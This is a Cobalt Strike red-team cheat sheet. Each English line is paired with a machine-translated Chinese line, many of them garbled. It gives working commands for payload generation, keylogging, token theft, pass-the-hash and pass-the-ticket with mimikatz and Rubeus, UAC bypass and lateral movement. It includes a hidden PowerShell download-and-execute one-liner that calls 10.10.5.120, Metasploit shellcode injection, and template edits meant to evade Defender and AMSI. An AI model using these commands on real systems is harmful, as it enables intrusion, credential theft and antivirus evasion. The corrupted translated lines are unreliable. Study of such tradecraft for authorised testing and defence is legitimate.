# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

`钴罢工 - >侦听器 - >添加/编辑“然后您可以选择要聆听的位置，要使用哪种信标（HTTP，DNS，SMB ...）等。

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

这些听众的信标无需直接与C2交谈，他们可以通过其他信标与它进行交流。

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

`钴罢工 - >听众 - >添加/编辑“然后您需要选择TCP或SMB信标

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon

*** TCP信标将在选定的端口中设置侦听器**。 要连接到TCP信标，请使用命令`connect <ip> <port>`从另一个信标
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

*** SMB信标将在选定名称**的管道中收听。 要连接到SMB信标，您需要使用命令`链接[target] [pipe]`。

### Generate & Host payloads

###生成和主机有效载荷

#### Generate payloads in files

####文件中生成有效载荷

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** for HTA files

***`htmlapplication` ** hta文件
* **`MS Office Macro`** for an office document with a macro

*** MS Office Macro` **用于带有宏的办公室文档
* **`Windows Executable`** for a .exe, .dll orr service .exe

*** Windows可执行文件**用于.exe，.dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

*** Windows可执行文件（S）`** for a ** stageless **。

#### Generate & Host payloads

####生成和主机有效载荷

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

`攻击 - > Web Drive -by->脚本网络交付（S）`这将生成一个脚本/可执行文件，以从钴罢工中下载信标，以：BITSADMIN，EXE，POWERSHELL和PYTHON

#### Host Payloads

####主机有效载荷

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

如果您已经拥有要在Web服务器中托管的文件，则只需转到“攻击 - > Web驱动器 - >主机文件”，然后选择用于主机和Web服务器配置的文件。

### Beacon Options

###信标选项

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary

<pre class =“ language-bash”> <code class =“ lang-bash”>＃执行本地.net二进制
execute-assembly &#x3C;/path/to/executable.exe>

execute-eSembly＆＃x3c;/path/to/executable.exe>

# Screenshots

＃屏幕截图
printscreen    # Take a single screenshot via PrintScr method

打印屏幕＃通过打印屏幕方法拍摄单个屏幕截图
screenshot     # Take a single screenshot

屏幕截图＃拍摄单个屏幕截图
screenwatch    # Take periodic screenshots of desktop

ScreenWatch＃进行桌面的定期屏幕截图## Go to View -> Screenshots to see them

##去查看 - >屏幕截图查看它们

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

## view>击键要查看按键

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process

portscan [pid] [arch] [targets] [ports] [arp | icmp | none] [max connections]＃indect portscan动作在另一个过程中
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell

＃ 电源外壳
# Import Powershell module

＃导入PowerShell模块
powershell-import C:\path\to\PowerView.ps1

powershell-import c：\ path \ to \ powerview.ps1
powershell &#x3C;just write powershell cmd here>

PowerShell＆＃x3C;只需在此处写PowerShell CMD>

# User impersonation

＃用户模仿
## Token generation with creds

##代币产生的信用
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network

make_token [domain \ user] [密码] #create代币在网络中模仿用户
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer

ls \\ computer_name \ c $＃尝试使用生成的令牌访问计算机中的c $
rev2self # Stop using token generated with make_token

rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

##使用make_token生成事件4624：成功登录了一个帐户。 此事件在Windows域中非常普遍，但是可以通过过滤登录类型来缩小范围。 如上所述，它使用logon32_logon_new_credentials，type 9。

# UAC Bypass

＃UAC旁路
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>

elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

runasadmin uac -cmstplua powershell.exe -nop -w隐藏-c“ iex（（new -object net.webclient）.downloadstring（'http：//10.10.5.120:80/b'））

## Steal token from pid
## Like make_token but stealing the token from a process

##像make_token一样，但从过程中窃取令牌
steal_token [pid] # Also, this is useful for network actions, not local actions

steal_token [pid]＃另外，这对于网络动作而不是本地操作很有用
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.

##来自API文档，我们知道此登录类型“允许呼叫者克隆其当前令牌”。 这就是为什么Beacon Output表示模仿＆＃x3C; current_username>  - 它模仿我们自己的克隆令牌的原因。
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer

ls \\ computer_name \ c $＃尝试使用生成的令牌访问计算机中的c $
rev2self # Stop using token from steal_token

## Launch process with nwe credentials

## NWE凭据的启动过程
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\

spawnas [域\用户名] [密码] [侦听器]＃从带有读取访问的目录进行＃do，例如：cd c：\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

##像make_token一样，这将生成Windows Event 4624：成功登录一个帐户，但登录类型为2（logon32_logon_interactive）。 它将详细介绍调用用户（targetUsername）和模仿用户（targetOutOutBoundUsername）。

## Inject into process

##注入进程
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

##从OPSEC的角度来看：除非您确实必须（例如x86-> x64或x64或x64-> x86），否则请勿执行跨平台注入。

## Pass the hash

##通过哈希
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.

##此修改过程需要对LSASS存储器进行修补，这是一个高风险动作，需要本地管理员特权，而如果启用了受保护的过程灯（PPL），则不可行。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]

PTH [PID] [ARCH] [域\ user] [ntlm hash]
pth [DOMAIN\user] [NTLM hash]

pth [域\用户] [ntlm hash]

## Pass the hash through mimikatz

##通过mimikatz将哈希传递
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"

mimikatz sekurlsa :: pth /user：＆＃x3c; username> /domain：＆＃x3c; domain> /ntlm：＆＃x3c; ntlm hash> /run> /run：“ powerShell -w hidden hidden shidend offident”
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)

## withuot /run，mimikatz spawn a cmd.exe，如果您是用桌面的用户运行的，他会看到shell（如果您作为系统运行，您可以使用）
steal_token &#x3C;pid> #Steal token from process created by mimikatz

seth_token＆＃x3c; pid> #steal令牌来自mimikatz创建的过程

## Pass the ticket

##通过票
## Request a ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec

execute-semembly c：\ path \ rubeus.exe asktgt /user：＆＃x3c; username> /domain：＆＃x3c; domain> /aes256：＆＃x3c; aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)

##创建一个新的登录会话，以与新票一起使用（不要覆盖受损的票证）
make_token &#x3C;domain>\&#x3C;username> DummyPass

make_token＆＃x3c;域> \＆＃x3c; username> dummypass
## Write the ticket in the attacker machine from a poweshell session &#x26; load it

##从PowerShell会话中将机票写入攻击机机器＆＃x26; 加载它
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM

##通过系统票
## Generate a new process with the ticket

##用票生成一个新过程
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

execute-eSembly c：\ path \ rubeus.exe asktgt /user：＆＃x3c; username> /domain：＆＃x3c; domain> /aes256：＆＃x3c; aes key> /nowrap /opsec /opsec /opsec /createNetonly：c：c：\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ Windows \ System32 \ cmd.exe
## Steal the token from that process

##从该过程中窃取令牌
steal_token &#x3C;pid>

## Extract ticket + Pass the ticket

##提取票 +通过门票
### List tickets
execute-assembly C:\path\Rubeus.exe triage

执行组件C：\ path \ rubeus.exe triage
### Dump insteresting ticket by luid

### LUID的转储内部票
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap

execute-semembly c：\ path \ rubeus.exe dump /service：krbtgt /luid：＆＃x3c; luid> /nowrap
### Create new logon session, note luid and processid

###创建新的登录会话，注意Luid和ProcessID
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

execute-semembly c：\ path \ rubeus.exe createNeTonly /program：c：\ windows \ system32 \ cmd.exe
### Insert ticket in generate logon session

###在生成登录会话中插入票
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

execute-semembly c：\ path \ rubeus.exe ptt /luid：0x92a8c /ticket：[... base64-ticket ...]
### Finally, steal the token from that new process

###最后，从这个新过程中窃取令牌
steal_token &#x3C;pid>

# Lateral Movement
## If a token was created it will be used

##如果创建了一个令牌，它将被使用
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact

## PSEXEC X86使用服务运行服务Exe Artifact
## psexec64                  x64   Use a service to run a Service EXE artifact

## psexec64 x64使用服务运行服务EXE ARTIFACT
## psexec_psh                x86   Use a service to run a PowerShell one-liner

## PSEXEC_PSH X86使用服务运行PowerShell单线
## winrm                     x86   Run a PowerShell script via WinRM

## WinRM X86通过WinRM运行PowerShell脚本
## winrm64                   x64   Run a PowerShell script via WinRM

## WinRM64 X64通过WinRM运行PowerShell脚本

remote-exec [method] [target] [command]

远程-Exec [方法] [target] [命令]
## Methods:
<strong>## psexec                          Remote execute via Service Control Manager

<strong> ## PSEXEC远程通过服务控制管理器执行</strong>## winrm                           Remote execute via WinRM (PowerShell)

</strong> ## Winrm远程通过WinRM（PowerShell）执行
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it

##用WMI执行信标（它不是INS跳跃命令）只需上传标准并执行它
beacon> upload C:\Payloads\beacon-smb.exe

BEACON>上传C：\有效载荷\ Beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

BEACON>远程EXEC WMI SRV-1 C：\ Windows \ Beacon-smb.exe


# Pass session to Metasploit - Through listener

＃通过会话到Metasploit-通过听众
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http

MSF6 Exploit（Multi/Handler）>设置有效载荷Windows/MeterPreter/Reverse_httpmsf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.

##在钴上：侦听器>将有效载荷添加到外国HTTP。 将主机设置为10.10.5.120，端口为8080，然后单击“保存”。
beacon> spawn metasploit

信标>产卵元普洛伊特
## You can only spawn x86 Meterpreter sessions with the foreign listener.

##您只能与外国听众相关X86 MeterPreter会议。

# Pass session to Metasploit - Through shellcode injection

＃通过shellcode注入到Metasploit的通过
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin

msfvenom -p Windows/x64/meterpreter_reverse_http lhost =＆＃x3c; ip> lport =＆＃x3c; port> -f raw -o/tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to coblat strike host

##将bin文件复制到钴罢工主机
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

shinjects＆＃x3c; pid> x64 c：\有效载荷\ msf.bin #inject shellcode在x64进程中

# Pass metasploit session to cobalt strike

＃通过Metasploit会议进行钴罢工
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.

## Fenate无符合信标SHELLCODE，转到攻击>软件包> Windows可执行文件，选择所需的侦听器，选择RAW作为输出类型，然后选择使用X64有效载荷。
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode

##在metasploit中使用post/windows/manage/shellcode_inject注入生成的钴srike shellcode


# Pivoting
## Open a socks proxy in the teamserver

##在TeamServer中打开袜子代理
beacon> socks 1080

信标>袜子1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

信标> SSH 10.10.17.12:22用户名密码</code> </pre>

## Avoiding AVs

### Artifact Kit

###文物套件

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

通常在`/opt/cobaltstrike/trifact-kit`中找到代码和预编译的模板（在`/src-common'中）的有效载荷，钴罢工将用于生成二进制信标。

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

使用[thrantcheck]（https://github.com/rasta-mouse/threatcheck）与生成的后门（或仅使用编译模板），您可以找到使Defender触发的内容。 通常是字符串。 因此，您只需修改正在生成后门的代码，以便将字符串出现在最终二进制中。

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

修改代码后，只需从同一目录运行`。/build.sh`并将`dist-pipe/`文件夹复制到`c：\ tools \ tools \ cobaltstrike \ artifactkit`中的Windows client。

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

不要忘记加载激进的脚本`dist-pipe \ artifact.cna`以指示使用我们想要的磁盘中的资源，而不是加载的磁盘。

### Resource Kit

###资源套件

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

ResourceKit文件夹包含Cobalt Strike基于脚本的有效载荷的模板，包括PowerShell，VBA和HTA。

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

使用[https://github.com/rasta-mouse/threatcheck）与模板一起使用[https://github.com/rasta-mouse/threatcheck）。

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

修改检测到的行可以生成不会捕获的模板。

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

不要忘记加载激进的脚本`resourcekit \ resources.cna`表示钴打击以吸收我们想要的磁盘中的资源，而不是加载的磁盘。







```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d cyberbotic.io



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
